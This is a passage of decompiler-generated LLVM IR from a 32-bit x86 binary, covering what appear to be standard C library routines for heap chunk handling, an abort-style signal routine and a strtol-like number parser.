  %v2_8053982 = inttoptr i32 %v1_8053982 to i32*
  %v3_8053982 = load i32, i32* %v2_8053982, align 4
  store i32 %v3_8053982, i32* @ecx, align 4
  %v12_8053985 = icmp eq i32 %v3_8053982, %v2_805397a
  %v1_8053987 = icmp eq i1 %v12_8053985, false
  br i1 %v1_8053987, label %dec_label_pc_80539c5, label %dec_label_pc_8053989

dec_label_pc_8053989:                             ; preds = %dec_label_pc_8053975
  %v1_8053989 = add i32 %v3_805397f, 8
  %v2_8053989 = inttoptr i32 %v1_8053989 to i32*
  %v3_8053989 = load i32, i32* %v2_8053989, align 4
  %v15_8053989 = icmp eq i32 %v3_8053989, %v3_8053982
  %v1_805398c = icmp eq i1 %v15_8053989, false
  br i1 %v1_805398c, label %dec_label_pc_80539c5, label %dec_label_pc_805398e

dec_label_pc_805398e:                             ; preds = %dec_label_pc_8053989
  %v2_805398e = add i32 %v3_8053975, %v1_805392d
  store i32 %v2_805398e, i32* @ebx, align 4
  store i32 %v3_805397f, i32* %v2_8053982, align 4
  %v0_8053993 = load i32, i32* @edi, align 4
  %v1_8053993 = load i32, i32* @edx, align 4
  %v2_8053993 = add i32 %v1_8053993, 8
  %v3_8053993 = inttoptr i32 %v2_8053993 to i32*
  store i32 %v0_8053993, i32* %v3_8053993, align 4
  %v0_805399d.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_8053996

dec_label_pc_8053996:                             ; preds = %dec_label_pc_805395d, %dec_label_pc_805398e
  %v1_80539a9 = phi i32 [ %v2_8053960, %dec_label_pc_805395d ], [ %v0_805399d.pre, %dec_label_pc_805398e ]
  %v1_805399a = and i32 %v3_8053968, -4
  store i32 %v1_805399a, i32* @ebp, align 4
  %v1_805399d = load i32, i32* @global_var_8056bac.207, align 4
  %v12_805399d = icmp eq i32 %v1_80539a9, %v1_805399d
  br i1 %v12_805399d, label %dec_label_pc_80539f7, label %dec_label_pc_80539a5

dec_label_pc_80539a5:                             ; preds = %dec_label_pc_8053996
  %v2_80539a5 = add i32 %v1_80539a9, 4
  %v3_80539a5 = add i32 %v2_80539a5, %v1_805399a
  %v4_80539a5 = inttoptr i32 %v3_80539a5 to i32*
  %v5_80539a5 = load i32, i32* %v4_80539a5, align 4
  store i32 %v5_80539a5, i32* %eax.global-to-local, align 4
  %v3_80539a9 = inttoptr i32 %v2_80539a5 to i32*
  store i32 %v1_805399a, i32* %v3_80539a9, align 4
  %v0_80539ac = load i32, i32* %eax.global-to-local, align 4
  %v1_80539ac = urem i32 %v0_80539ac, 2
  %v2_80539ac = icmp eq i32 %v1_80539ac, 0
  store i32 %v1_80539ac, i32* %eax.global-to-local, align 4
  %v1_80539b1 = icmp eq i1 %v2_80539ac, false
  br i1 %v1_80539b1, label %dec_label_pc_80539d2, label %dec_label_pc_80539b3

dec_label_pc_80539b3:                             ; preds = %dec_label_pc_80539a5
  %v0_80539b3 = load i32, i32* @esi, align 4
  %v1_80539b3 = add i32 %v0_80539b3, 8
  %v2_80539b3 = inttoptr i32 %v1_80539b3 to i32*
  %v3_80539b3 = load i32, i32* %v2_80539b3, align 4
  store i32 %v3_80539b3, i32* @edx, align 4
  %v1_80539b6 = add i32 %v0_80539b3, 12
  %v2_80539b6 = inttoptr i32 %v1_80539b6 to i32*
  %v3_80539b6 = load i32, i32* %v2_80539b6, align 4
  store i32 %v3_80539b6, i32* %eax.global-to-local, align 4
  %v1_80539b9 = add i32 %v3_80539b3, 12
  %v2_80539b9 = inttoptr i32 %v1_80539b9 to i32*
  %v3_80539b9 = load i32, i32* %v2_80539b9, align 4
  store i32 %v3_80539b9, i32* @edi, align 4
  %v12_80539bc = icmp eq i32 %v3_80539b9, %v0_80539b3
  %v1_80539be = icmp eq i1 %v12_80539bc, false
  br i1 %v1_80539be, label %dec_label_pc_80539c5, label %dec_label_pc_80539c0

dec_label_pc_80539c0:                             ; preds = %dec_label_pc_80539b3
  %v1_80539c0 = add i32 %v3_80539b6, 8
  %v2_80539c0 = inttoptr i32 %v1_80539c0 to i32*
  %v3_80539c0 = load i32, i32* %v2_80539c0, align 4
  %v15_80539c0 = icmp eq i32 %v3_80539c0, %v3_80539b9
  br i1 %v15_80539c0, label %dec_label_pc_80539ca, label %dec_label_pc_80539c5

dec_label_pc_80539c5:                             ; preds = %dec_label_pc_80539c0, %dec_label_pc_80539b3, %dec_label_pc_8053989, %dec_label_pc_8053975
  %v0_80539c5 = call i32 @function_8053a85()
  store i32 %v0_80539c5, i32* %eax.global-to-local, align 4
  %v1_80539ca.pre = load i32, i32* @edx, align 4
  br label %dec_label_pc_80539ca

dec_label_pc_80539ca:                             ; preds = %dec_label_pc_80539c0, %dec_label_pc_80539c5
  %v1_80539ca = phi i32 [ %v3_80539b3, %dec_label_pc_80539c0 ], [ %v1_80539ca.pre, %dec_label_pc_80539c5 ]
  %v0_80539ca = phi i32 [ %v3_80539b6, %dec_label_pc_80539c0 ], [ %v0_80539c5, %dec_label_pc_80539c5 ]
  %v2_80539ca = add i32 %v1_80539ca, 12
  %v3_80539ca = inttoptr i32 %v2_80539ca to i32*
  store i32 %v0_80539ca, i32* %v3_80539ca, align 4
  %v0_80539cd = load i32, i32* @edx, align 4
  %v1_80539cd = load i32, i32* %eax.global-to-local, align 4
  %v2_80539cd = add i32 %v1_80539cd, 8
  %v3_80539cd = inttoptr i32 %v2_80539cd to i32*
  store i32 %v0_80539cd, i32* %v3_80539cd, align 4
  %v0_80539d0 = load i32, i32* @ebx, align 4
  %v1_80539d0 = load i32, i32* @ebp, align 4
  %v2_80539d0 = add i32 %v1_80539d0, %v0_80539d0
  store i32 %v2_80539d0, i32* @ebx, align 4
  br label %dec_label_pc_80539d2

dec_label_pc_80539d2:                             ; preds = %dec_label_pc_80539a5, %dec_label_pc_80539ca
  %v0_80539d2 = load i32, i32* @global_var_8056bbc.225, align 4
  store i32 %v0_80539d2, i32* %eax.global-to-local, align 4
  %v0_80539d7 = load i32, i32* @ecx, align 4
  %v1_80539d7 = add i32 %v0_80539d7, 12
  %v2_80539d7 = inttoptr i32 %v1_80539d7 to i32*
  store i32 ptrtoint (i32* @global_var_8056bb4.209 to i32), i32* %v2_80539d7, align 4
  %v0_80539de = load i32, i32* %eax.global-to-local, align 4
  %v1_80539de = load i32, i32* @ecx, align 4
  %v2_80539de = add i32 %v1_80539de, 8
  %v3_80539de = inttoptr i32 %v2_80539de to i32*
  store i32 %v0_80539de, i32* %v3_80539de, align 4
  %v0_80539e1 = load i32, i32* @ebx, align 4
  %v1_80539e1 = load i32, i32* @ecx, align 4
  %v3_80539e1 = add i32 %v1_80539e1, %v0_80539e1
  %v4_80539e1 = inttoptr i32 %v3_80539e1 to i32*
  store i32 %v0_80539e1, i32* %v4_80539e1, align 4
  %v0_80539e4 = load i32, i32* @ecx, align 4
  %v1_80539e4 = load i32, i32* %eax.global-to-local, align 4
  %v2_80539e4 = add i32 %v1_80539e4, 12
  %v3_80539e4 = inttoptr i32 %v2_80539e4 to i32*
  store i32 %v0_80539e4, i32* %v3_80539e4, align 4
  %v0_80539e7 = load i32, i32* @ebx, align 4
  %v1_80539e9 = or i32 %v0_80539e7, 1
  store i32 %v1_80539e9, i32* %eax.global-to-local, align 4
  %v0_80539ec = load i32, i32* @ecx, align 4
  store i32 %v0_80539ec, i32* @global_var_8056bbc.225, align 4
  %v2_80539f2 = add i32 %v0_80539ec, 4
  %v3_80539f2 = inttoptr i32 %v2_80539f2 to i32*
  store i32 %v1_80539e9, i32* %v3_80539f2, align 4
  br label %dec_label_pc_8053a07

dec_label_pc_80539f7:                             ; preds = %dec_label_pc_8053996
  %v0_80539f7 = load i32, i32* @ebx, align 4
  %v2_80539f7 = add i32 %v0_80539f7, %v1_805399a
  store i32 %v2_80539f7, i32* @ebx, align 4
  %v1_80539fb = or i32 %v2_80539f7, 1
  store i32 %v1_80539fb, i32* %eax.global-to-local, align 4
  %v1_80539fe = load i32, i32* @ecx, align 4
  %v2_80539fe = add i32 %v1_80539fe, 4
  %v3_80539fe = inttoptr i32 %v2_80539fe to i32*
  store i32 %v1_80539fb, i32* %v3_80539fe, align 4
  %v0_8053a01 = load i32, i32* @ecx, align 4
  store i32 %v0_8053a01, i32* @global_var_8056bac.207, align 4
  br label %dec_label_pc_8053a07

dec_label_pc_8053a07:                             ; preds = %dec_label_pc_80539d2, %dec_label_pc_80539f7
  %v0_8053a07 = load i32, i32* @ebx, align 4
  %tmp21 = icmp ult i32 %v0_8053a07, 131072
  br i1 %tmp21, label %dec_label_pc_8053a6c, label %dec_label_pc_8053a0f

dec_label_pc_8053a0f:                             ; preds = %dec_label_pc_8053a07
  %v0_8053a0f = load i8, i8* @global_var_8056b80.206, align 128
  %v1_8053a0f = and i8 %v0_8053a0f, 2
  %v2_8053a0f = icmp eq i8 %v1_8053a0f, 0
  br i1 %v2_8053a0f, label %dec_label_pc_8053a28, label %dec_label_pc_8053a18

dec_label_pc_8053a18:                             ; preds = %dec_label_pc_8053a0f
  %v2_8053a20 = call i32 @function_8053741(i32* bitcast (i8* @global_var_8056b80.206 to i32*))
  store i32 %v2_8053a20, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8053a28

dec_label_pc_8053a28:                             ; preds = %dec_label_pc_8053a0f, %dec_label_pc_8053a18
  %v0_8053a28 = load i32, i32* @global_var_8056bac.207, align 4
  store i32 %v0_8053a28, i32* %eax.global-to-local, align 4
  %v1_8053a2d = add i32 %v0_8053a28, 4
  %v2_8053a2d = inttoptr i32 %v1_8053a2d to i32*
  %v3_8053a2d = load i32, i32* %v2_8053a2d, align 4
  %v1_8053a30 = and i32 %v3_8053a2d, -4
  store i32 %v1_8053a30, i32* %eax.global-to-local, align 4
  %v1_8053a33 = load i32, i32* @global_var_8056ec4.223, align 4
  %v7_8053a33 = icmp ult i32 %v1_8053a30, %v1_8053a33
  br i1 %v7_8053a33, label %dec_label_pc_8053a6c, label %dec_label_pc_8053a3b

dec_label_pc_8053a3b:                             ; preds = %dec_label_pc_8053a28
  store i32 ptrtoint (i8* @global_var_8056b80.206 to i32), i32* @edx, align 4
  %v0_8053a40 = load i32, i32* @global_var_8056ec8.221, align 8
  store i32 %v0_8053a40, i32* @eax, align 4
  %v0_8053a45 = call i32 @function_80536b4()
  store i32 %v0_8053a45, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8053a6c

dec_label_pc_8053a4c:                             ; preds = %dec_label_pc_8053954
  %v2_8053a4c = inttoptr i32 %v1_805391d to i32*
  %v3_8053a4c = load i32, i32* %v2_8053a4c, align 4
  %v0_8053a4f = load i32, i32* @global_var_8056ed0.214, align 16
  %v1_8053a4f = add i32 %v0_8053a4f, -1
  store i32 %v1_8053a4f, i32* @global_var_8056ed0.214, align 16
  %v2_8053a55 = add i32 %v3_8053a4c, %v1_805392d
  store i32 %v2_8053a55, i32* %eax.global-to-local, align 4
  %v2_8053a58 = sub i32 %v1_805391d, %v3_8053a4c
  %v0_8053a5e = load i32, i32* @global_var_8056ee4.217, align 4
  %v2_8053a5e = sub i32 %v0_8053a5e, %v2_8053a55
  store i32 %v2_8053a5e, i32* @global_var_8056ee4.217, align 4
  %v4_8053a64 = inttoptr i32 %v2_8053a58 to i32*
  %v5_8053a64 = call i32 @function_80547b5(i32* %v4_8053a64, i32 %v2_8053a55, i32 %v1_805392d, i32 %v1_805392d)
  store i32 %v5_8053a64, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8053a6c

dec_label_pc_8053a6c:                             ; preds = %dec_label_pc_8053a28, %dec_label_pc_8053a07, %dec_label_pc_8053a3b, %dec_label_pc_8053934, %dec_label_pc_8053a4c
  store i32 %v2_8053907, i32* @eax, align 4
  %v2_8053a75 = call i32 @function_8054050(i32 %v2_8053907, i32 1)
  store i32 %v2_8053a75, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8053a7d

dec_label_pc_8053a7d:                             ; preds = %dec_label_pc_80538e9, %dec_label_pc_8053a6c
  %.0 = phi i32 [ undef, %dec_label_pc_80538e9 ], [ %v2_8053a75, %dec_label_pc_8053a6c ]
  store i32 %v0_80538ec, i32* @ebx, align 4
  store i32 %v0_80538eb, i32* @esi, align 4
  store i32 %v0_80538ea, i32* @edi, align 4
  store i32 %v0_80538e9, i32* @ebp, align 4
  ret i32 %.0

; uselistorder directives
  uselistorder i32 %v3_8053a4c, { 1, 0 }
  uselistorder i32 %v0_80539e1, { 1, 0 }
  uselistorder i32 %v1_80539ac, { 1, 0 }
  uselistorder i32 %v2_80539a5, { 1, 0 }
  uselistorder i32 %v1_805399a, { 0, 2, 1, 3 }
  uselistorder i32 %v1_80539a9, { 1, 0 }
  uselistorder i32 %v1_805392d, { 3, 4, 0, 1, 2, 5, 6 }
  uselistorder i32 %v3_8053928, { 1, 2, 0, 3 }
  uselistorder i32 %v1_805391d, { 1, 4, 2, 3, 0, 5 }
  uselistorder i32* %eax.global-to-local, { 0, 1, 2, 5, 3, 4, 6, 7, 8, 9, 10, 11, 14, 15, 12, 13, 16, 17, 18, 19, 20, 21, 22, 23, 24 }
  uselistorder i32* bitcast (i8* @global_var_8056b80.206 to i32*), { 0, 2, 1, 3 }
  uselistorder i32 ptrtoint (i32* @global_var_8056bb4.209 to i32), { 1, 2, 3, 4, 5, 6, 7, 0, 8 }
  uselistorder i32* @global_var_8056bac.207, { 1, 2, 3, 4, 5, 6, 7, 8, 0, 9, 10, 11 }
  uselistorder i32 ptrtoint (i8* @global_var_8056b80.206 to i32), { 7, 6, 0, 5, 4, 1, 3, 2 }
  uselistorder i8* @global_var_8056b80.206, { 4, 7, 6, 5, 3, 0, 2, 1 }
  uselistorder i32 ptrtoint (i32* @global_var_80567e0.205 to i32), { 0, 1, 4, 2, 3, 5 }
  uselistorder i32 %arg1, { 1, 0, 4, 3, 2 }
  uselistorder label %dec_label_pc_8053a7d, { 1, 0 }
  uselistorder label %dec_label_pc_8053a6c, { 4, 2, 0, 1, 3 }
  uselistorder label %dec_label_pc_8053a28, { 1, 0 }
  uselistorder label %dec_label_pc_8053a07, { 1, 0 }
  uselistorder label %dec_label_pc_80539d2, { 1, 0 }
  uselistorder label %dec_label_pc_80539ca, { 1, 0 }
  uselistorder label %dec_label_pc_8053996, { 1, 0 }
}

define i32 @function_8053a85() local_unnamed_addr {
dec_label_pc_8053aa0.lr.ph:
  %eax.global-to-local = alloca i32, align 4
  %stack_var_-272 = alloca i32, align 4
  %stack_var_-132 = alloca i32, align 4
  %stack_var_-284 = alloca i32, align 4
  %v1_8053a91 = call i32 @function_805404d(i32 ptrtoint (i32* @global_var_80567f8.226 to i32))
  %v12_8053a9b = ptrtoint i32* %stack_var_-284 to i32
  store i32 31, i32* %eax.global-to-local, align 4
  %v4_8053aa048 = add i32 %v12_8053a9b, 276
  %v5_8053aa049 = inttoptr i32 %v4_8053aa048 to i32*
  store i32 0, i32* %v5_8053aa049, align 4
  %v0_8053aab50 = load i32, i32* %eax.global-to-local, align 4
  %v1_8053aab51 = add i32 %v0_8053aab50, -1
  %v9_8053aab52 = icmp slt i32 %v1_8053aab51, 0
  store i32 %v1_8053aab51, i32* %eax.global-to-local, align 4
  %v1_8053aac53 = icmp eq i1 %v9_8053aab52, false
  br i1 %v1_8053aac53, label %dec_label_pc_8053aa0.dec_label_pc_8053aa0_crit_edge, label %dec_label_pc_8053aae

dec_label_pc_8053aa0.dec_label_pc_8053aa0_crit_edge: ; preds = %dec_label_pc_8053aa0.lr.ph, %dec_label_pc_8053aa0.dec_label_pc_8053aa0_crit_edge
  %v1_8053aab54 = phi i32 [ %v1_8053aab, %dec_label_pc_8053aa0.dec_label_pc_8053aa0_crit_edge ], [ %v1_8053aab51, %dec_label_pc_8053aa0.lr.ph ]
  %v0_8053aa0.pre = load i32, i32* @esp, align 4
  %v2_8053aa0 = mul i32 %v1_8053aab54, 4
  %v3_8053aa0 = add i32 %v0_8053aa0.pre, 152
  %v4_8053aa0 = add i32 %v3_8053aa0, %v2_8053aa0
  %v5_8053aa0 = inttoptr i32 %v4_8053aa0 to i32*
  store i32 0, i32* %v5_8053aa0, align 4
  %v0_8053aab = load i32, i32* %eax.global-to-local, align 4
  %v1_8053aab = add i32 %v0_8053aab, -1
  %v9_8053aab = icmp slt i32 %v1_8053aab, 0
  store i32 %v1_8053aab, i32* %eax.global-to-local, align 4
  %v1_8053aac = icmp eq i1 %v9_8053aab, false
  br i1 %v1_8053aac, label %dec_label_pc_8053aa0.dec_label_pc_8053aa0_crit_edge, label %dec_label_pc_8053aae

dec_label_pc_8053aae:                             ; preds = %dec_label_pc_8053aa0.dec_label_pc_8053aa0_crit_edge, %dec_label_pc_8053aa0.lr.ph
  %v0_8053aae = load i32, i32* @ebx, align 4
  %v2_8053ab2 = ptrtoint i32* %stack_var_-132 to i32
  store i32 %v2_8053ab2, i32* @ebx, align 4
  %v4_8053aba = call i32 @function_8052ade(i32 %v2_8053ab2, i32 6, i32 %v0_8053aae, i32 %v0_8053aae)
  store i32 %v4_8053aba, i32* %eax.global-to-local, align 4
  %v1_8053ac2 = icmp eq i32 %v4_8053aba, 0
  %v1_8053ac4 = icmp eq i1 %v1_8053ac2, false
  br i1 %v1_8053ac4, label %dec_label_pc_8053ad4, label %dec_label_pc_8053ac6

dec_label_pc_8053ac6:                             ; preds = %dec_label_pc_8053aae
  %v3_8053acc = bitcast i32* %stack_var_-132 to %_TYPEDEF_sigset_t*
  %v4_8053acc = call i32 @function_80523fd(i32 1, %_TYPEDEF_sigset_t* %v3_8053acc, i32 0)
  store i32 %v4_8053acc, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8053ad4

dec_label_pc_8053ad4:                             ; preds = %dec_label_pc_8053aae, %dec_label_pc_8053ac6
  %v2_8053b0c23 = phi i32 [ %v4_8053aba, %dec_label_pc_8053aae ], [ %v4_8053acc, %dec_label_pc_8053ac6 ]
  %v0_8053ad4 = load i8, i8* @global_var_80568f4.227, align 4
  %v1_8053ad4 = icmp eq i8 %v0_8053ad4, 0
  %v1_8053adb = icmp eq i1 %v1_8053ad4, false
  br i1 %v1_8053adb, label %dec_label_pc_8053b0c, label %dec_label_pc_8053add

dec_label_pc_8053add:                             ; preds = %dec_label_pc_8053ad4
  store i8 1, i8* @global_var_80568f4.227, align 4
  br label %dec_label_pc_8053ae4

dec_label_pc_8053ae4:                             ; preds = %dec_label_pc_8053b4b, %dec_label_pc_8053add
  %v1_8053aec = call i32 @function_805404d(i32 ptrtoint (i32* @global_var_80567f8.226 to i32))
  store i32 %v1_8053aec, i32* %eax.global-to-local, align 4
  %v1_8053af8 = call i32 @function_80529b0(i32 6)
  store i32 %v1_8053af8, i32* %eax.global-to-local, align 4
  %v1_8053b04 = call i32 @function_805404d(i32 ptrtoint (i32* @global_var_80567f8.226 to i32))
  store i32 %v1_8053b04, i32* %eax.global-to-local, align 4
  %v0_8053b0c.pre = load i8, i8* @global_var_80568f4.227, align 4
  br label %dec_label_pc_8053b0c

dec_label_pc_8053b0c:                             ; preds = %dec_label_pc_8053ad4, %dec_label_pc_8053ae4
  %v2_8053b0c = phi i32 [ %v2_8053b0c23, %dec_label_pc_8053ad4 ], [ %v1_8053b04, %dec_label_pc_8053ae4 ]
  %v0_8053b0c = phi i8 [ %v0_8053ad4, %dec_label_pc_8053ad4 ], [ %v0_8053b0c.pre, %dec_label_pc_8053ae4 ]
  %v1_8053b0c = zext i8 %v0_8053b0c to i32
  %v3_8053b0c = and i32 %v2_8053b0c, -256
  %v4_8053b0c = or i32 %v1_8053b0c, %v3_8053b0c
  store i32 %v4_8053b0c, i32* %eax.global-to-local, align 4
  %v10_8053b11 = icmp eq i8 %v0_8053b0c, 1
  %v1_8053b13 = icmp eq i1 %v10_8053b11, false
  br i1 %v1_8053b13, label %dec_label_pc_8053b6d, label %dec_label_pc_8053b40.lr.ph

dec_label_pc_8053b40.lr.ph:                       ; preds = %dec_label_pc_8053b0c
  store i8 2, i8* @global_var_80568f4.227, align 4
  %v2_8053b24 = ptrtoint i32* %stack_var_-272 to i32
  store i32 %v2_8053b24, i32* %eax.global-to-local, align 4
  %v3_8053b29 = bitcast i32* %stack_var_-272 to i8*
  %v4_8053b29 = call i32 @function_805271a(i8* %v3_8053b29, i32 0, i32 140)
  store i32 0, i32* %stack_var_-272, align 4
  store i32 31, i32* %eax.global-to-local, align 4
  %v4_8053b4040 = add i32 %v12_8053a9b, 140
  %v5_8053b4041 = inttoptr i32 %v4_8053b4040 to i32*
  store i32 -1, i32* %v5_8053b4041, align 4
  %v0_8053b4842 = load i32, i32* %eax.global-to-local, align 4
  %v1_8053b4843 = add i32 %v0_8053b4842, -1
  %v9_8053b4844 = icmp slt i32 %v1_8053b4843, 0
  store i32 %v1_8053b4843, i32* %eax.global-to-local, align 4
  %v1_8053b4945 = icmp eq i1 %v9_8053b4844, false
  br i1 %v1_8053b4945, label %dec_label_pc_8053b40.dec_label_pc_8053b40_crit_edge, label %dec_label_pc_8053b4b

dec_label_pc_8053b40.dec_label_pc_8053b40_crit_edge: ; preds = %dec_label_pc_8053b40.lr.ph, %dec_label_pc_8053b40.dec_label_pc_8053b40_crit_edge
  %v1_8053b4846 = phi i32 [ %v1_8053b48, %dec_label_pc_8053b40.dec_label_pc_8053b40_crit_edge ], [ %v1_8053b4843, %dec_label_pc_8053b40.lr.ph ]
  %v0_8053b40.pre = load i32, i32* @esp, align 4
  %v2_8053b40 = mul i32 %v1_8053b4846, 4
  %v3_8053b40 = add i32 %v0_8053b40.pre, 16
  %v4_8053b40 = add i32 %v3_8053b40, %v2_8053b40
  %v5_8053b40 = inttoptr i32 %v4_8053b40 to i32*
  store i32 -1, i32* %v5_8053b40, align 4
  %v0_8053b48 = load i32, i32* %eax.global-to-local, align 4
  %v1_8053b48 = add i32 %v0_8053b48, -1
  %v9_8053b48 = icmp slt i32 %v1_8053b48, 0
  store i32 %v1_8053b48, i32* %eax.global-to-local, align 4
  %v1_8053b49 = icmp eq i1 %v9_8053b48, false
  br i1 %v1_8053b49, label %dec_label_pc_8053b40.dec_label_pc_8053b40_crit_edge, label %dec_label_pc_8053b4b

dec_label_pc_8053b4b:                             ; preds = %dec_label_pc_8053b40.dec_label_pc_8053b40_crit_edge, %dec_label_pc_8053b40.lr.ph
  store i32 %v2_8053b24, i32* %eax.global-to-local, align 4
  %v4_8053b60 = call i32 @function_805428f(i32 6, i32* nonnull %stack_var_-272, i32 0)
  store i32 %v4_8053b60, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8053ae4

dec_label_pc_8053b6d:                             ; preds = %dec_label_pc_8053b0c
  %v10_8053b6d = icmp eq i8 %v0_8053b0c, 2
  %v1_8053b6f = icmp eq i1 %v10_8053b6d, false
  br i1 %v1_8053b6f, label %dec_label_pc_8053b79, label %dec_label_pc_8053b79.thread

dec_label_pc_8053b79.thread:                      ; preds = %dec_label_pc_8053b6d
  store i8 3, i8* @global_var_80568f4.227, align 4
  br label %dec_label_pc_8053b82

dec_label_pc_8053b79:                             ; preds = %dec_label_pc_8053b6d
  %v9_8053b79 = icmp eq i8 %v0_8053b0c, 3
  %v1_8053b80 = icmp eq i1 %v9_8053b79, false
  br i1 %v1_8053b80, label %dec_label_pc_8053b93, label %dec_label_pc_8053b82

dec_label_pc_8053b82:                             ; preds = %dec_label_pc_8053b79.thread, %dec_label_pc_8053b79
  store i8 4, i8* @global_var_80568f4.227, align 4
  %v1_8053b8e = call i32 @function_80543f0(i32 127)
  unreachable

dec_label_pc_8053b93:                             ; preds = %dec_label_pc_8053b79, %dec_label_pc_8053b93
  br label %dec_label_pc_8053b93

; uselistorder directives
  uselistorder i32 %v1_8053b48, { 2, 1, 0 }
  uselistorder i32 %v1_8053aab, { 2, 1, 0 }
  uselistorder i32* %stack_var_-272, { 0, 2, 1, 3 }
  uselistorder i32* %eax.global-to-local, { 0, 1, 2, 15, 16, 11, 12, 3, 4, 5, 6, 7, 8, 9, 10, 17, 18, 13, 14 }
  uselistorder i8 3, { 0, 4, 1, 2, 3 }
  uselistorder i8 2, { 8, 11, 12, 1, 13, 2, 3, 4, 5, 6, 14, 15, 7, 0, 10, 16, 9 }
  uselistorder i8* @global_var_80568f4.227, { 5, 4, 3, 0, 2, 1 }
  uselistorder label %dec_label_pc_8053b93, { 1, 0 }
  uselistorder label %dec_label_pc_8053b82, { 1, 0 }
  uselistorder label %dec_label_pc_8053b40.dec_label_pc_8053b40_crit_edge, { 1, 0 }
  uselistorder label %dec_label_pc_8053b0c, { 1, 0 }
  uselistorder label %dec_label_pc_8053ad4, { 1, 0 }
  uselistorder label %dec_label_pc_8053aa0.dec_label_pc_8053aa0_crit_edge, { 1, 0 }
}

define i32 @function_8053b96() local_unnamed_addr {
dec_label_pc_8053b96:
  %tmp = call i32 @__decompiler_undefined_function_0()
  %v3_8053ba1 = call i32 @function_8053baa(i32 %tmp, i32 0, i32 10)
  ret i32 %v3_8053ba1
}

define i32 @function_8053baa(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_8053baa:
  %v4_8053bbb = inttoptr i32 %arg1 to i8*
  %v5_8053bbb = call i32 @function_8053bc4(i8* %v4_8053bbb, i32 %arg2, i32 %arg3, i32 1)
  ret i32 %v5_8053bbb
}

define i32 @function_8053bc4(i8* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_8053bc4:
  %eax.global-to-local = alloca i32, align 4
  %ebp.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %tmp = trunc i32 %arg4 to i8
  %tmp41 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-16 = alloca i32, align 4
  %v0_8053bc7 = load i32, i32* @ebx, align 4
  store i32 %v0_8053bc7, i32* %stack_var_-16, align 4
  %v0_8053bcb = load i32, i32* bitcast (i32** @global_var_805682c.229 to i32*), align 4
  store i32 %v0_8053bcb, i32* %edx.global-to-local, align 4
  %v4_8053bd1 = ptrtoint i8* %arg1 to i32
  store i32 %arg3, i32* %esi.global-to-local, align 4
  store i32 %v4_8053bd1, i32* %ebx.global-to-local, align 4
  %v2_8053bde7 = load i8, i8* %arg1, align 1
  %v3_8053bde8 = sext i8 %v2_8053bde7 to i32
  store i32 %v3_8053bde8, i32* %eax.global-to-local, align 4
  %v2_8053be110 = mul nsw i32 %v3_8053bde8, 2
  %v3_8053be111 = add i32 %v2_8053be110, %v0_8053bcb
  %v4_8053be112 = inttoptr i32 %v3_8053be111 to i8*
  %v5_8053be113 = load i8, i8* %v4_8053be112, align 1
  %v6_8053be114 = and i8 %v5_8053be113, 32
  %v7_8053be115 = icmp eq i8 %v6_8053be114, 0
  %v1_8053be516 = icmp eq i1 %v7_8053be115, false
  br i1 %v1_8053be516, label %dec_label_pc_8053bdd, label %dec_label_pc_8053be7

dec_label_pc_8053bdd:                             ; preds = %dec_label_pc_8053bc4, %dec_label_pc_8053bdd
  %v0_8053bdd = phi i32 [ %v1_8053bdd, %dec_label_pc_8053bdd ], [ %v4_8053bd1, %dec_label_pc_8053bc4 ]
  %v1_8053bdd = add i32 %v0_8053bdd, 1
  store i32 %v1_8053bdd, i32* %ebx.global-to-local, align 4
  %v1_8053bde = inttoptr i32 %v1_8053bdd to i8*
  %v2_8053bde = load i8, i8* %v1_8053bde, align 1
  %v3_8053bde = sext i8 %v2_8053bde to i32
  store i32 %v3_8053bde, i32* %eax.global-to-local, align 4
  %v2_8053be1 = mul nsw i32 %v3_8053bde, 2
  %v3_8053be1 = add i32 %v2_8053be1, %v0_8053bcb
  %v4_8053be1 = inttoptr i32 %v3_8053be1 to i8*
  %v5_8053be1 = load i8, i8* %v4_8053be1, align 1
  %v6_8053be1 = and i8 %v5_8053be1, 32
  %v7_8053be1 = icmp eq i8 %v6_8053be1, 0
  %v1_8053be5 = icmp eq i1 %v7_8053be1, false
  br i1 %v1_8053be5, label %dec_label_pc_8053bdd, label %dec_label_pc_8053be7

dec_label_pc_8053be7:                             ; preds = %dec_label_pc_8053bdd, %dec_label_pc_8053bc4
  %v0_8053bfc = phi i32 [ %v4_8053bd1, %dec_label_pc_8053bc4 ], [ %v1_8053bdd, %dec_label_pc_8053bdd ]
  %v4_8053c15 = phi i32 [ %v3_8053bde8, %dec_label_pc_8053bc4 ], [ %v3_8053bde, %dec_label_pc_8053bdd ]
  %v9_8053be7 = icmp eq i32 %v4_8053c15, 43
  br i1 %v9_8053be7, label %dec_label_pc_8053bfc, label %dec_label_pc_8053bec

dec_label_pc_8053bec:                             ; preds = %dec_label_pc_8053be7
  store i32 0, i32* %ebp.global-to-local, align 4
  %v9_8053bee = icmp eq i32 %v4_8053c15, 45
  %v1_8053bf1 = icmp eq i1 %v9_8053bee, false
  br i1 %v1_8053bf1, label %dec_label_pc_8053bfd, label %dec_label_pc_8053bfc

dec_label_pc_8053bfc:                             ; preds = %dec_label_pc_8053be7, %dec_label_pc_8053bec
  %storemerge2 = phi i32 [ 1, %dec_label_pc_8053bec ], [ 0, %dec_label_pc_8053be7 ]
  store i32 %storemerge2, i32* %ebp.global-to-local, align 4
  %v1_8053bfc = add i32 %v0_8053bfc, 1
  store i32 %v1_8053bfc, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8053bfd

dec_label_pc_8053bfd:                             ; preds = %dec_label_pc_8053bec, %dec_label_pc_8053bfc
  %v0_8053c0f = phi i32 [ %v0_8053bfc, %dec_label_pc_8053bec ], [ %v1_8053bfc, %dec_label_pc_8053bfc ]
  %v1_8053bff = and i32 %arg3, -17
  %v2_8053bff = icmp eq i32 %v1_8053bff, 0
  %v1_8053c05 = icmp eq i1 %v2_8053bff, false
